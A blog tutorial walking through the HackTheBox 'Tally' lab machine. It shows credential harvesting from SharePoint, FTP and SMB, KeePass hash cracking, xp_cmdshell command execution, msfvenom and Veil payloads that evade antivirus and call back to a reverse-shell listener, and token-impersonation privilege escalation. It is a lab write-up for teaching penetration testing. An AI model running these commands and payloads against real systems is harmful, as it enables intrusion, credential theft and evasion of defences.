---
layout: post
title:  "How to hack a site made in Sharepoint"
description: "Learn pentesting web from 0 with HackTheBox (Tally)"
date:   2019-04-05
image:  SharepointHacked.jpg
tags:   [Enumeration, Pentesting WEB, Escalation Privilege, Obfuscation techniques]
---

Hello Hackers!  
Today we will learn a variety of interesting things, all thanks to the HackTheBox machine called Tally.  

## With this tutorial you will learn:  
1. How to perform an intrusion test on a server with Sharepoint
2. How to Hack KeePass Passwords using Hashcat
3. How to use FTP
    - List Files.
    - Download Files.
    - Upload Files.
4. How to use SMBClient for the service SMB.
    - List Files.
    - Download Files.
5. How to use Hashcat from 0.
    - how to crack a keepass database.
6. How to use Metasploit Framework.
7. How to use SQSH
8. How to perform a directory discovery with Gobuster.
9. How to perform a simple port scan with Nmap.
10. How to evade windows defend with Veil/Evasion
11. How to evade windows defend with MsfVenon.
12. How to scale privileges with incognito and RottenPotato

## Hacking [Tally](https://www.hackthebox.eu/home/machines/profile/113)
## Initial part

As always we will start enumerating our victim machine with Nmap.

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally]─[root@Arthorias]─[0]─[2784]
╰─[:)] # nmap -A 10.10.10.59

Starting Nmap 7.70 ( https://nmap.org ) 
Nmap scan report for 10.10.10.59
Host is up (0.048s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-generator: Microsoft SharePoint
|_http-server-header: Microsoft-IIS/10.0
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp  open  ccproxy-http?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2018-01-26T13:06:37
|_Not valid after:  2048-01-26T13:06:37
|_ssl-date: 2018-01-26T19:08:45+00:00; +7s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.50%E=4%D=1/26%OT=21%CT=1%CU=44020%PV=Y%DS=2%DC=T%G=Y%TM=5A6B7CC
OS:6%P=i686-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=O%TS=A)
OS:SEQ(SP=101%GCD=1%ISR=10A%TI=RD%CI=I%II=I%TS=8)SEQ(SP=101%GCD=1%ISR=10A%T
OS:I=I%CI=I%TS=A)SEQ(SP=101%GCD=1%ISR=10A%TI=I%TS=A)OPS(O1=M54DNW8ST11%O2=M
OS:54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN
OS:(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=200
OS:0%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%
OS:RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6s, deviation: 0s, median: 6s
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol
{% endhighlight %}

With the previous Nmap scan, we managed to identify several interesting services, including a Sharepoint site.  
Next, we will perform a directory discovery with Gobuster using one of the SecLists dictionaries.

Seclists, It is a collection of multiple types of dictionaries used during security assessments, compiled in one place. These lists include usernames, passwords, URLs, confidential data patterns, fuzzing payloads and many more.  
[Full article in Kali-Linux](https://tools.kali.org/password-attacks/seclists)  

Gobuster, It is a tool used for brute force:  
	- Discovery of URIs (directories and files) on websites.  
	- Discovery of DNS Subdomains (with wildcard support).  
[Full article in Kali-Linux](https://tools.kali.org/web-applications/gobuster)  

Among the results thrown by the Gobuster, I will show the most relevant.

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally]─[root@Arthorias]─[0]─[2784]
╰─[:)] # gobuster -w /usr/share/seclists/Discovery/Web-Content/CMS/sharepoint.txt -u http://10.10.10.59/

Gobuster v2.0.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.59/
[+] Threads      : 10
[+] Wordlist     : /usr/share/seclists/Discovery/Web_Content/sharepoint.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/_layouts (Status: 301)
/_catalogs/masterpage/forms/allitems.aspx (Status: 200)
/_layouts/viewlsts.aspx (Status: 302)
/shared documents/forms/allitems.aspx (Status: 200)
/_layouts/dws.aspx (Status: 302)
/_layouts/emaildetails.aspx (Status: 302)
/_layouts/excelserversafedataproviders.aspx (Status: 200)
/_layouts/login.aspx (Status: 302)
/_layouts/mngsiteadmin.aspx (Status: 302)
/_layouts/manageservicepermissions.aspx (Status: 200)
/_layouts/mysite.aspx (Status: 200)
/_layouts/people.aspx?membershipgroupid=0 (Status: 302)
/_layouts/upload.aspx (Status: 302)
/_vti_bin/authentication.asmx (Status: 200)
=====================================================
{% endhighlight %}

Of everything found by the Gobuster, one of the most interesting routes of a site made with Sharepoint, are:

{% highlight markdown %}
    - /shared documents/forms/allitems.aspx (Status: 200)
    - /_layouts/viewlsts.aspx (Status: 302)
{% endhighlight %}  

We will review the previously mentioned routes.

<figure>
  <img src="{{site.baseurl}}/img/SharepointTally.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/SharepointTally.png" title="Homepage of Sharepoint">Homepage of Sharepoint</a>.
  </figcaption>
</figure>

We can identify that there is a document and also a page of the site listed in the directory.
If we review the Documents page, we are presented with the following:

<figure>
  <img src="{{site.baseurl}}/img/FTPCredDocTally.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/FTPCredDocTally.png" title="Document with interesting name in a Sharepoint path">Document with interesting name in a Sharepoint path</a>.
  </figcaption>
</figure>

<figure>
  <img src="{{site.baseurl}}/img/OpenDocFTPTally.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/OpenDocFTPTally.png" title="Opening Sharepoint Document">Opening Sharepoint Document</a>.
  </figcaption>
</figure>

After downloading the file, we are presented with the following information:  

{% highlight markdown %}
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
{% endhighlight %}  

Apparently we found an FTP credentials, we will continue enumerating to see if we find information about the user.  
Let's review the other route we had.

<figure>
  <img src="{{site.baseurl}}/img/SharepointFtpTally.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/SharepointFtpTally.png" title="Document with interesting name in a Sharepoint path">Document with interesting name in a Sharepoint path</a>
  </figcaption>
</figure>

<figure>
  <img src="{{site.baseurl}}/img/SharepointFtpTally2.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/SharepointFtpTally2.png" title="FTP user found">FTP user found</a>
  </figcaption>
</figure>

Ok, we have got a username and password for the FTP service.  
Let's authenticate.

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally/ftp]─[root@Arthorias]─[0]─[3041]
╰─[:)] # ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-31-17  10:51PM       <DIR>          From-Custodian
10-01-17  10:37PM       <DIR>          Intranet
08-28-17  05:56PM       <DIR>          Logs
09-15-17  08:30PM       <DIR>          To-Upload
09-17-17  08:27PM       <DIR>          User
226 Transfer complete.
{% endhighlight %}  

We found some directories, after listing a while we found some interesting things.  
In Tim's folder we found a KeePass database.  

{% highlight shell %}
ftp> cd Tim
250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
09-17-17  08:39PM       <DIR>          Files
09-02-17  07:08AM       <DIR>          Project
226 Transfer complete.
ftp> cd Files
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-15-17  07:58PM                   17 bonus.txt
09-15-17  08:24PM       <DIR>          KeePass-2.36
09-15-17  08:22PM                 2222 tim.kdbx
{% endhighlight %}  

Let's take that KeePass database and see if we can decipher the password with HashCat; but first we must extract a hash compatible with HashCat, for this we will use a tool called keepass2john from the John The Ripper suite.  

Hashcat, is the world’s fastest and most advanced password recovery utility, supporting five unique modes of attack for over 200 highly-optimized hashing algorithms. hashcat currently supports CPUs, GPUs, and other hardware accelerators on Linux, Windows, and OSX, and has facilities to help enable distributed password cracking.   
[Full article in Kali-Linux](https://tools.kali.org/password-attacks/hashcat)  

Jhon The Ripper, is designed to be both feature-rich and fast. It combines several cracking modes in one program and is fully configurable for your particular needs.   
[Full article in Kali-Linux](https://tools.kali.org/password-attacks/john)

{% highlight shell %}
ftp> get tim.kdbx
local: tim.kdbx remote: tim.kdbx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2222 bytes received in 0.05 secs (42.3532 kB/s)
{% endhighlight %}  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally/ftp]─[root@Arthorias]─[0]─[3041]
╰─[:)] # keepass2john tim.kdbx > tim.hash
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally/ftp]─[root@Arthorias]─[0]─[3041]
╰─[:)] # cat tim.hash 
tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
{% endhighlight %}  

Now that we have our hash we can run against hashcat.  
NOTE: Remove *tim:* from the hash before trying to crack.   
I'm going to use HashCat in Windows, this way I can identify my GPU and the cracking process will be faster.  

{% highlight shell %}
C:\hashcat-5.1.0> .\hashcat64.exe -m 13400 .\tim.hash .\rockyou.txt
hashcat (v5.1.0) starting...

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c
Watchdog: Temperature retain trigger disabled.

Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14343296
* Bytes.....: 139921497
* Keyspace..: 14343296

$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo

Session..........: hashcat
Status...........: Cracked
Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*6000*222*f362b5565b916422607711b54e8d0b...1cd7da
{% endhighlight %}  

Tim’s password is *simplementeyo*.
Let’s open up the database with Keepass.  
We find a user and password.

{% highlight markdown %}
Finance:Acc0unting 
{% endhighlight %}  

Let’s check these credentials with smbclient.  
**SMBCLIENT**, An SMB client program for UNIX machines is included with the Samba distribution. It provides an ftp-like interface on the command line. You can use this utility to transfer files between a Windows 'server' and a Linux client.  
[Full article](https://www.tldp.org/HOWTO/SMB-HOWTO-8.html)

{% highlight shell %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally/ftp]─[root@Arthorias]─[1]─[3084]
╰─[:(] # smbclient -L \\\\10.10.10.59 -U Finance
Enter WORKGROUP\Finance's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ACCT            Disk      
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.59 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

{% endhighlight %}  

Let's access the **ACCT** directory.

{% highlight shell %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations]─[root@Arthorias]─[0]─[3173]
╰─[:)] # smbclient \\\\10.10.10.59\\ACCT -U Finance
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\Finance's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 18 01:58:18 2017
  ..                                  D        0  Mon Sep 18 01:58:18 2017
  Customers                           D        0  Sun Sep 17 16:28:40 2017
  Fees                                D        0  Mon Aug 28 17:20:52 2017
  Invoices                            D        0  Mon Aug 28 17:18:19 2017
  Jess                                D        0  Sun Sep 17 16:41:29 2017
  Payroll                             D        0  Mon Aug 28 17:13:32 2017
  Reports                             D        0  Fri Sep  1 16:50:11 2017
  Tax                                 D        0  Sun Sep 17 16:45:47 2017
  Transactions                        D        0  Wed Sep 13 15:57:44 2017
  zz_Archived                         D        0  Fri Sep 15 16:29:35 2017
  zz_Migration                        D        0  Sun Sep 17 16:49:13 2017

		8387839 blocks of size 4096. 676902 blocks available
{% endhighlight %}   

First we find some SQL connection information inside the zz_Archived folder.  

{% highlight shell %}
smb: \> cd zz_Archived
smb: \zz_Archived\> ls
  .                                   D        0  Fri Sep 15 16:29:35 2017
  ..                                  D        0  Fri Sep 15 16:29:35 2017
  2016 Audit                          D        0  Mon Aug 28 17:28:47 2017
  fund-list-2014.xlsx                 A    25874  Wed Sep 13 15:58:22 2017
  SQL                                 D        0  Fri Sep 15 16:29:36 2017

		8387839 blocks of size 4096. 676414 blocks available
smb: \zz_Archived\> cd SQL
smb: \zz_Archived\SQL\> ls
  .                                   D        0  Fri Sep 15 16:29:36 2017
  ..                                  D        0  Fri Sep 15 16:29:36 2017
  conn-info.txt                       A       77  Sun Sep 17 16:26:56 2017

		8387839 blocks of size 4096. 676269 blocks available
smb: \zz_Archived\SQL\> get conn-info.txt
getting file \zz_Archived\SQL\conn-info.txt of size 77 as conn-info.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
{% endhighlight %}  

We look at the contents of the file with the command **cat**.

{% highlight shell %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally/smb]─[root@Arthorias]─[0]─[3178]
╰─[:)] # cat conn-info.txt 
old server details

db: sa
pass: YE%TJC%&HYbe5Nw

have changed for tally
{% endhighlight %}  

After a search between the directories, we find **tester.exe** looks interesting and seems to be custom.

{% highlight shell %}
smb: \zz_Migration\Binaries\New folder\> ls
  .                                   D        0  Thu Sep 21 02:21:09 2017
  ..                                  D        0  Thu Sep 21 02:21:09 2017
  crystal_reports_viewer_2016_sp04_51051980.zip      A 389188014  Wed Sep 13 15:56:38 2017
  Macabacus2016.exe                   A 18159024  Mon Sep 11 17:20:05 2017
  Orchard.Web.1.7.3.zip               A 21906356  Tue Aug 29 19:27:42 2017
  putty.exe                           A   774200  Sun Sep 17 16:19:26 2017
  RpprtSetup.exe                      A   483824  Fri Sep 15 15:49:46 2017
  tableau-desktop-32bit-10-3-2.exe      A 254599112  Mon Sep 11 17:13:14 2017
  tester.exe                          A   215552  Fri Sep  1 07:15:54 2017
  vcredist_x64.exe                    A  7194312  Wed Sep 13 16:06:28 2017

		8387839 blocks of size 4096. 558580 blocks available
smb: \zz_Migration\Binaries\New folder\> get tester.exe
getting file \zz_Migration\Binaries\New folder\tester.exe of size 215552 as tester.exe (389.1 KiloBytes/sec) (average 389.1 KiloBytes/sec)
{% endhighlight %}  

The next step is to see the printable character strings of .EXE file.

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally/smb]─[root@Arthorias]─[0]─[3178]
╰─[:)] # strings tester.exe
!This program cannot be run in DOS mode.
Rich7J
~~~
~~~
SQLSTATE: 
Message: 
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
select * from Orchard_Users_UserPartRecord
~~~
~~~
{% endhighlight %}  

Ready, we have found a username and a password.   
And also with the previous information acquired, we know that these credentials apparently are from SQL Server.

## Getting shell #1

We identify with the previous credentials with *sqsh*.  
sqsh, is commandline SQL client for MS SQL and Sybase servers to connect to Sybase or Microsoft SQL servers.  
[Reference](https://sourceforge.net/projects/sqsh/)

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally/smb]─[root@Arthorias]─[0]─[3178]
╰─[:)] # sqsh -S 10.10.10.59 -U sa
sqsh-2.1.7 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2010 Michael Peppler
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Password: 
1>
{% endhighlight %}  

After authenticating, we must enable the *xp_cmdshell* so that we can get execution of commands on our victim machine.

{% highlight zsh %}
1> EXEC SP_CONFIGURE N'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> EXEC SP_CONFIGURE N'xp_cmdshell', 1
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> RECONFIGURE
2> go
{% endhighlight %}  

Ready, now let's try something simple let's list the disk C.  
In this way we validate that we can now execute commands on the victim.

{% highlight zsh %}
1> xp_cmdshell 'dir C:\';
2> go

	output                                                                  
----------------------------------------------------------

	 Volume in drive C has no label.                                        
	 Volume Serial Number is 8EB3-6DCB                                      
	NULL  

	 Directory of C:\  
	NULL                                                                                                                       
	18/09/2017  05:58    <DIR>          ACCT                                                      
	18/09/2017  20:35    <DIR>          FTP                                                       
	18/09/2017  21:35    <DIR>          inetpub                                                   
	16/07/2016  13:23    <DIR>          PerfLogs                                                  
	24/12/2017  01:46    <DIR>          Program Files                                             
	19/10/2017  22:09    <DIR>          Program Files (x86)                                       
	01/10/2017  19:46    <DIR>          TEMP                                                      
	12/10/2017  20:28    <DIR>          Users                                                     
	23/10/2017  20:44    <DIR>          Windows                                                        
	               0 File(s)              0 bytes                                       
	               9 Dir(s)   2,260,242,432 bytes free
{% endhighlight %}  

Excellent, after having our RCE, we will proceed by listing everything.  
We will execute the command *systeminfo*, which is used to return the system information.

{% highlight zsh %}
1> xp_cmdshell 'systeminfo';
2> go

	output                                                                                        
	-----------------------------------------------------------------------------------------
    -----------------------------------------------------------------------------------------

	The current directory is invalid.                                                                                                                                                           

NULL
{% endhighlight %}  

Apparently certain commands are not available.  
To avoid these errors we must use the operator *&* in the following way:

{% highlight zsh %}
1> xp_cmdshell 'cd C:\ & systeminfo';
2> go

	output                                                                              
----------------------------------------------------------

	NULL                                                                             
	Host Name:                 TALLY                                                   
	OS Name:                   Microsoft Windows Server 2016 Standard
	OS Version:                10.0.14393 N/A Build 14393 
	OS Manufacturer:           Microsoft Corporation  
	OS Configuration:          Standalone Server 
	OS Build Type:             Multiprocessor Free 
	Registered Owner:          Windows User       
	Registered Organization:                      
	Product ID:                00376-30726-67778-AA877
	Original Install Date:     28/08/2017, 15:43:34   
	System Boot Time:          17/02/2018, 20:05:52      
	System Manufacturer:       VMware, Inc.   
	System Model:              VMware Virtual Platform    
	System Type:               x64-based PC   
	Processor(s):              2 Processor(s) Installed.    
	                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz       
	                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz    
	BIOS Version:              Phoenix Technologies LTD 6.00, 05/04/2016 
	Windows Directory:         C:\Windows                
	System Directory:          C:\Windows\system32       
	Boot Device:               \Device\HarddiskVolume1    
	System Locale:             en-gb;English (United Kingdom) 
	Input Locale:              en-gb;English (United Kingdom) 
	Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London                                               
	Total Physical Memory:     2,047 MB  
	Available Physical Memory: 231 MB                                                                            
	Virtual Memory: Max Size:  4,458 MB    
	Virtual Memory: Available: 657 MB                    

	Virtual Memory: In Use:    3,801 MB                  

	Page File Location(s):     C:\pagefile.sys           

	Domain:                    HTB.LOCAL                

	Logon Server:              \\TALLY       
	Hotfix(s):                 2 Hotfix(s) Installed. 
	                           [01]: KB3199986           

	                           [02]: KB4015217           

	Network Card(s):           1 NIC(s) Installed.  
	                           [01]: Intel(R) 82574L Gigabit Network Connection                                                   
	                                 Connection Name: Ethernet0  
	                                 DHCP Enabled:    No  
	                                 IP address(es)     
	                                 [01]: 10.10.10.59   
	                                 [02]: fe80::c5bc:7321:fb5d:9066
	                                 [03]: dead:beef::c5bc:7321:fb5d:9066  
                                                          

Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
{% endhighlight %}  

Perfect, apparently our compromised machine has as an operating system, Windows Server 2016.  
Which probably means that if we try to load a payload generated with msfvenom, it will be detected by Windows Defender. There is even a note on Sarah's desk that confirms that she enabled Windows Defender and also patched the system.

{% highlight zsh %}
1> xp_cmdshell 'type C:\Users\Sarah\Desktop\todo.txt';
2> go

done:

install updates
check windows defender enabled

outstanding:

update intranet design
update server inventory
{% endhighlight %}  

## Evading Windows Defender with Veil-Evasion
We will generate a payload with Veil and upload it to the FTP server, specifically to the *Intranet folder.*

<script id="asciicast-239315" src="https://asciinema.org/a/239315.js" async></script>  

I recommend you read the following [blog](https://hackingprofessional.github.io/Security/Evadiendo-un-firewall-con-Veil-Evasion/), in which I explain in a more detailed way the generation of this.  

After generating the *exe* we can upload via FTP to the Intranet folder.  
We know we have write permissions there from the instructions on the SharePoint Finance page from earlier.

{% highlight shell %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally/smb]─[root@Arthorias]─[0]─[3178]
╰─[:)] # ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> cd intranet
250 CWD command successful.
ftp> bin
200 Type set to I.
ftp> put Malware.exe
local: Malware.exe remote: Malware.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
4769528 bytes sent in 29.98 secs (155.3659 kB/s)
{% endhighlight %}  

Now we can start our handler in Metasploit and execute our payload via SQL.

{% highlight bash %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally]─[root@Arthorias]─[0]─[3508]
╰─[:)] # msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf5 exploit(multi/handler) > set LPORT 6969
LPORT => 6969

msf5 exploit(multi/handler) > run
	
[*] Started reverse TCP handler on 10.10.14.7:6969
{% endhighlight %}  

The EXE would be executed in the following way.

{% highlight shell %}
1> xp_cmdshell 'cd C:\FTP\Intranet\ & Malware.exe';
2> go
{% endhighlight %}  

After executing it, in our metasploit window we will receive our shell.

{% highlight shell %}
[*] Sending stage (179779 bytes) to 10.10.10.59
[*] Meterpreter session 1 opened (10.10.14.7:6969 -> 10.10.10.59:56560 at 2019-03-25 18:18:18 

meterpreter > shell
Process 1524 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\FTP\Intranet>whoami
whoami
tally\sarah
Excellent, we already have a shell in Tally with the user sarah.
{% endhighlight %}  

Another easiest way to get a shell on this machine, would be using a metasploit auxiliary.

## Getting shell #2  
## Evading Windows Defender with Metasploit  

Let’s make a meterpreter payload using msfvenom. If we use the psh-reflection format our payload evade the antivirus detection:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally]─[root@Arthorias]─[0]─[3508]
╰─[:)] # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=6969 -f psh-reflection -o Malware2.ps1
{% endhighlight %}  

We configure our listener using *exploit/multi/handler*:  

{% highlight bash %}
msf5> use exploit/multi/handler
msf5 exploit(handler) > options

Module options (exploit/multi/handler):

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.7       yes       The listen address
   LPORT     6969             yes       The listen port

msf exploit(handler) > exploit
[*] Started reverse TCP handler on 127.0.0.1:6969
{% endhighlight %}  

Now, upload **Malware2.ps1** to /Intranet via FTP.  
We can execute our payload via MSSQL as previously indicated:

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Tally]─[root@Arthorias]─[0]─[3508]
╰─[:)] # msfconsole
msf5> use  auxiliary/admin/mssql/mssql_exec
msf5 auxiliary(mssql_exec) > set CMD "powershell -ExecutionPolicy bypass -NoExit -File C:\\FTP\\Intranet\\Malware2.ps1"
msf5 auxiliary(mssql_exec) > info

Basic options:
  Name             Current Setting
  ----             ---------------
  CMD              powershell -ExecutionPolicy bypass -NoExit -File C:\FTP\Intranet\msf.ps1
  PASSWORD         GWE3V65#6KFH93@4GWTG2G
  RHOST            10.10.10.59
  RPORT            1433
  TDSENCRYPTION    false
  USERNAME         sa
  USE_WINDOWS_AUTH false

msf5 auxiliary(mssql_exec) > exploit
{% endhighlight %}  

In the parameter *CMD* of the auxiliary, we must configure it to execute with powershell our obfuscated payload.  
The auxiliary used is *auxiliary/admin/mssql/mssql_exec*.  
The mssql_exec admin module takes advantage of the xp_cmdshell stored procedure to execute commands on the remote system.  
[Reference](https://www.offensive-security.com/metasploit-unleashed/admin-mssql-auxiliary-modules/)  

After the *exploit* command, we have our shell:

{% highlight bash %}
meterpreter > sysinfo
Computer        : TALLY
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_GB
Domain          : HTB.LOCAL
Logged On Users : 7
Meterpreter     : x64/windows
{% endhighlight %}  

## Privilege Escalation

Here the interesting thing is is Sarah’s account is running as the SQL service account. So maybe we can elevate with this knowledge since service accounts usually have special privileges.  

For this final part we will learn to use Incognito and RottenPotato.  
Incognito was originally a stand-alone application that allowed you to impersonate user tokens when successfully compromising a system.  
[Reference](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/).  

The rotten potato exploit is a privilege escalation technique that allows escalation from service level accounts to SYSTEM through token impersonation.  
[Reference](https://hunter2.gitbook.io/darthsidious/privilege-escalation/token-impersonation).  

Through the getprivs command we can verify all the privileges enabled to the current process.  

{% highlight bash %}
meterpreter > getprivs
============================================================
Enabled Process Privileges
============================================================
  SeAssignPrimaryTokenPrivilege
  SeChangeNotifyPrivilege
  SeCreateGlobalPrivilege
  SeImpersonatePrivilege
  SeIncreaseQuotaPrivilege
  SeIncreaseWorkingSetPrivilege
{% endhighlight %}  

We upload the [rottenpotato](https://github.com/breenmachine/RottenPotatoNG) to our compromised machine.

{% highlight bash %}
meterpreter > cd C:\\Users\\Sarah\\Desktop
meterpreter > upload rottenpotato.exe
[*] uploading  : rottenpotato.exe -> rottenpotato.exe
[*] uploaded   : rottenpotato.exe -> rottenpotato.exe
{% endhighlight %}  

We load the module into our Meterpreter session by executing the use incognito command. Issuing the help command shows us the variety of options we have for incognito and brief descriptions of each option.  

{% highlight shell %}
meterpreter > use incognito
Loading extension incognito...success.
meterpreter > help

Incognito Commands
==================

    Command              Description                                             
    -------              -----------                                             
    add_group_user       Attempt to add a user to a global group with all tokens 
    add_localgroup_user  Attempt to add a user to a local group with all tokens  
    add_user             Attempt to add a user with all tokens                   
    impersonate_token    Impersonate specified token                             
    list_tokens          List tokens available under current user context        
    snarf_hashes         Snarf challenge/response hashes for every token         

{% endhighlight %}  

We see here that there is a valid Administrator token that looks to be of interest. We now need to impersonate this token in order to assume its privileges.   

{% highlight zsh %}
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
